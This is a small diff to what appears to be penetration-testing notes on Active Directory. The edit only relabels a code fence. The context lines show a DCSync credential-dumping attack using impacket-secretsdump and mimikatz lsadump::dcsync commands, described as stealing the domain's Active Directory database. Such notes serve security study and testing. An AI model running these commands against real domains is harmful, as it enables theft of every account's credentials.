@@ -385,7 +385,7 @@ We can add ourselves to interesting groups?
 
 You need at least `ReplicatingDirectoryChanges` and `[...]All` to perform a Domain Controller (DC) Synchronization (Sync) attack. It allows us to steal the Active Directory database.
 
-```
+```shell!
 $ impacket-secretsdump -outputfile example_hashes -just-dc example.com/username:password@DCIP
 mimikatz> lsadump::dcsync /user:example\username
 mimikatz> lsadump::dcsync /domain:example.com /user:example\username
